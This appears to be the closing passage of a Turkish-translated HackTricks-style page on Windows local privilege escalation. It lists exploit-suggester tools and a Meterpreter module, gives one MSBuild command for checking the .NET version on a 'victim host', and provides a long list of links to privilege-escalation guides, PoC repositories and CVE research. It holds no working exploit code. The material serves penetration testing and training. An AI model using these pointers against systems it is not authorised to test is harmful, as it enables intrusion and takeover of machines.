[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetkileri yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - kısa başvuru kılavuzu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni siyahtır (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Kapsamlı OSCP Kılavuzu](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Kılavuzu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM'e yükselmek için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Açılan Bir Bağlantı. Windows'ta Symbolic Link'leri Kötüye Kullanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Güven Aşamaları: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Çözülmüş C/C++ kontrol listesi zorlukları](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silmelerini Kötüye Kullanarak Privilege Escalation ve Diğer Harika Hileler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10 için Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Bir Görüntü Değişikliğinin Privilege Escalation'a Yol Açtığı Kerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
